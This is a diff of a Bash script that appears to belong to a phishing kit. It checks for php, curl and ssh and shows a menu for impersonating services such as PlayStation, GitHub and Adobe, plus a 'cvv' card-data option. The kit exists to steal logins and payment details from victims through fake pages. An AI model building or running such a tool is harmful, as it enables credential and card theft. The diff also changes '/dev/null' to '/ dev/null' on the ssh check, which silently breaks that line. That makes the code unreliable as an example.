@@ -11,7 +11,7 @@ trap 'printf "\n";stop;exit 1' 2
 dependencies() {
 command -v php > /dev/null 2>&1 || { echo >&2 "PHP is not installed ! Install it."; exit 1; }
 command -v curl > /dev/null 2>&1 || { echo >&2 "Curl is not installed ! Install it."; exit 1; }
-command -v ssh > /dev/null 2>&1 || { echo >&2 "Openssh is not installed ! Install it"; exit 1; }
+command -v ssh > / dev/null 2>&1 || { echo >&2 "Openssh is not installed ! Install it"; exit 1; }
 command -v unzip > /dev/null 2>&1 || { echo >&2 "Unzip is not installed ! Install it"; exit 1; }
 }
 
@@ -98,8 +98,9 @@ printf " \e[1;31m[\e[0m\e[1;77m09\e[0m\e[1;31m]\e[0m\e[1;93m PlayStation  \e[0m\
 printf " \e[1;31m[\e[0m\e[1;77m10\e[0m\e[1;31m]\e[0m\e[1;93m GitHub       \e[0m\e[1;31m[\e[0m\e[1;77m20\e[0m\e[1;31m]\e[0m\e[1;93m Adobe\e[0m\n"
 printf "\e[0m\n"
 printf " \e[1;31m[\e[0m\e[1;77mST\e[0m\e[1;31m]\e[0m\e[1;93m Termux Setup \e[1;31m[\e[0m\e[1;77mSL\e[0m\e[1;31m]\e[0m\e[1;93m Linux Setup  \e[0m\e[1;31m[\e[0m\e[1;77mEX\e[0m\e[1;31m]\e[0m\e[1;93m Exit\e[0m\n"
-printf "\e[0m\n         \e[0m\e[1;31m[\e[0m\e[1;77m20\e[0m\e[1;31m]\e[0m\e[1;93m cvv\e[0m\n"" 
+printf "\e[0m\n         \e[0m\e[1;31m[\e[0m\e[1;77m20\e[0m\e[1;31m]\e[0m\e[1;93m cvv\e[0m\n"
 read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select an option: \e[0m\e[1;96m\en' option
+
 if [[ $option == 1 || $option == 01 ]]; then
 facebook
 elif [[ $option == 2 || $option == 02 ]]; then
